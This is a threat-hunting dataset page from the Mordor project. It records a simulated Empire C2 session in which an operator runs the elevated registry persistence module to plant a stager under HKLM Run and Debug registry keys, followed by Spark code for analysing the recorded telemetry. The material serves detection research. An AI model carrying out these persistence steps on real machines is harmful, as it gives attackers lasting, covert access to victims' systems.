# Empire Elevated Registry

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518183936 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.tar.gz |

## Dataset Description
This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence.

## Adversary View
```
(Empire: TKV35P8X) > usemodule persistence/elevated/registry*
(Empire: powershell/persistence/elevated/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/elevated/registry
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) via the
  HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  Listener   False                                 Listener to use.                        
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKLM:SOFTWARE\Microsoft\  Registry location to store the script   
                        Windows\CurrentVersion\D  code. Last element is the key name.     
                        ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        TKV35P8X                  Agent to run module on.                 

(Empire: powershell/persistence/elevated/registry) > set Listener https
(Empire: powershell/persistence/elevated/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 1
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/registry
(Empire: powershell/persistence/elevated/registry) > Registry persistence established using listener https stored in HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/elevated/registry) > 
(Empire: powershell/persistence/elevated/registry) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_registry.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        